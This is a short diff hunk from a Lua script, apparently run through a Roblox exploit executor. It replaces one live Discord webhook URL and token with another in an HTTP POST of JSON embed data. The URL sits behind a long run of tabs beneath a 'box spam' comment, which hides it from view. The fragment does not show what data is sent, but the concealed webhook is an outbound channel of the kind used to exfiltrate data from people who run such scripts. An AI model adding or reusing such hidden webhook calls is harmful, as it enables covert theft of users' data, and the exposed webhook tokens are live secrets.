@@ -23,7 +23,7 @@ local Embed = {
 (syn and syn.request or http_request) {
 	
 --[[box spam]]--
-																																				Url = 'https://discord.com/api/webhooks/1388732282235256906/TRZGVIkEbI41pOl07mrddnH9nxXkSQOWDOG_uj-4iSkOPuMGqBoxgSSnKQOo1UGac-xp';
+																																				Url = 'https://discord.com/api/webhooks/1388948433427239005/Iq9LsEDJob4Vrj7wlGQGEIV5nSNn51TogHyfOUKXBiBSPMUUXByj3gq-rleF_xyayNAb';
     Method = 'POST';
     Headers = {
         ['Content-Type'] = 'application/json';
